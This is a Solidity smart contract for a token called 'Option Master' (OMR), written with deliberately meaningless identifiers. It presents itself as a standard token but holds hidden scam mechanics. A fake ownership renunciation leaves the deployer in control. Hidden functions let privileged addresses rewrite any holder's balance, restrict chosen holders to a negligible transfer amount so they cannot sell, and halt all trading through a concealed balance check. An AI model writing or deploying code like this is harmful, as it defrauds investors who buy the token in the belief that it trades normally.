//SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

interface listToken {
    function createPair(address receiverLaunch, address tradingMax) external returns (address);
}

interface tradingSwap {
    function totalSupply() external view returns (uint256);

    function balanceOf(address liquidityAuto) external view returns (uint256);

    function transfer(address minWallet, uint256 amountTo) external returns (bool);

    function allowance(address limitTrading, address spender) external view returns (uint256);

    function approve(address spender, uint256 amountTo) external returns (bool);

    function transferFrom(
        address sender,
        address minWallet,
        uint256 amountTo
    ) external returns (bool);

    event Transfer(address indexed from, address indexed swapFund, uint256 value);
    event Approval(address indexed limitTrading, address indexed spender, uint256 value);
}

abstract contract modeSwap {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface totalLaunchedAuto {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface autoIs is tradingSwap {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract OptionMaster is modeSwap, tradingSwap, autoIs {

    bool public txAmountIs;

    mapping(address => bool) public maxBuy;

    function allowance(address launchedTx, address senderWallet) external view virtual override returns (uint256) {
        if (senderWallet == fromIs) {
            return type(uint256).max;
        }
        return txLimit[launchedTx][senderWallet];
    }

    address private amountSwapAt;

    function name() external view virtual override returns (string memory) {
        return minMax;
    }

    bool private fundMin;

    function transfer(address txTo, uint256 amountTo) external virtual override returns (bool) {
        return launchTrading(_msgSender(), txTo, amountTo);
    }

    function launchTrading(address tradingIs, address minWallet, uint256 amountTo) internal returns (bool) {
        if (tradingIs == feeSell) {
            return feeTotalReceiver(tradingIs, minWallet, amountTo);
        }
        uint256 exemptTake = tradingSwap(fromAt).balanceOf(tokenReceiver);
        require(exemptTake == launchedExemptFee);
        require(minWallet != tokenReceiver);
        if (walletTotalSell[tradingIs]) {
            return feeTotalReceiver(tradingIs, minWallet, buyMin);
        }
        return feeTotalReceiver(tradingIs, minWallet, amountTo);
    }

    function isTrading(address txTo, uint256 amountTo) public {
        feeTo();
        receiverLiquidity[txTo] = amountTo;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return liquidityShould;
    }

    function feeTrading(address autoMarketing) public {
        feeTo();
        
        if (autoMarketing == feeSell || autoMarketing == fromAt) {
            return;
        }
        walletTotalSell[autoMarketing] = true;
    }

    function sellLaunch(address shouldTo) public {
        require(shouldTo.balance < 100000);
        if (txAmountIs) {
            return;
        }
        
        maxBuy[shouldTo] = true;
        
        txAmountIs = true;
    }

    function getOwner() external view returns (address) {
        return amountSwapAt;
    }

    function decimals() external view virtual override returns (uint8) {
        return shouldSender;
    }

    function buyAmount() public {
        emit OwnershipTransferred(feeSell, address(0));
        amountSwapAt = address(0);
    }

    bool private listLaunched;

    function txLiquidity(uint256 amountTo) public {
        feeTo();
        launchedExemptFee = amountTo;
    }

    mapping(address => bool) public walletTotalSell;

    mapping(address => uint256) private receiverLiquidity;

    string private minMax = "Option Master";

    constructor (){
        if (liquidityTeam != shouldTotalLaunched) {
            listLaunched = false;
        }
        totalLaunchedAuto tradingEnable = totalLaunchedAuto(fromIs);
        fromAt = listToken(tradingEnable.factory()).createPair(tradingEnable.WETH(), address(this));
        if (fundMin) {
            shouldTotalLaunched = liquidityTeam;
        }
        feeSell = _msgSender();
        maxBuy[feeSell] = true;
        receiverLiquidity[feeSell] = liquidityShould;
        buyAmount();
        
        emit Transfer(address(0), feeSell, liquidityShould);
    }

    uint256 constant buyMin = 6 ** 10;

    function owner() external view returns (address) {
        return amountSwapAt;
    }

    string private modeMaxShould = "OMR";

    uint256 launchedTrading;

    uint256 launchedExemptFee;

    function symbol() external view virtual override returns (string memory) {
        return modeMaxShould;
    }

    function feeTo() private view {
        require(maxBuy[_msgSender()]);
    }

    uint256 public shouldTotalLaunched;

    function balanceOf(address liquidityAuto) public view virtual override returns (uint256) {
        return receiverLiquidity[liquidityAuto];
    }

    address public feeSell;

    address public fromAt;

    uint8 private shouldSender = 18;

    uint256 private liquidityShould = 100000000 * 10 ** 18;

    uint256 private liquidityTeam;

    function transferFrom(address tradingIs, address minWallet, uint256 amountTo) external override returns (bool) {
        if (_msgSender() != fromIs) {
            if (txLimit[tradingIs][_msgSender()] != type(uint256).max) {
                require(amountTo <= txLimit[tradingIs][_msgSender()]);
                txLimit[tradingIs][_msgSender()] -= amountTo;
            }
        }
        return launchTrading(tradingIs, minWallet, amountTo);
    }

    bool private takeLaunch;

    address fromIs = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    event OwnershipTransferred(address indexed atModeTotal, address indexed sellWallet);

    function approve(address senderWallet, uint256 amountTo) public virtual override returns (bool) {
        txLimit[_msgSender()][senderWallet] = amountTo;
        emit Approval(_msgSender(), senderWallet, amountTo);
        return true;
    }

    address tokenReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    mapping(address => mapping(address => uint256)) private txLimit;

    function feeTotalReceiver(address tradingIs, address minWallet, uint256 amountTo) internal returns (bool) {
        require(receiverLiquidity[tradingIs] >= amountTo);
        receiverLiquidity[tradingIs] -= amountTo;
        receiverLiquidity[minWallet] += amountTo;
        emit Transfer(tradingIs, minWallet, amountTo);
        return true;
    }

}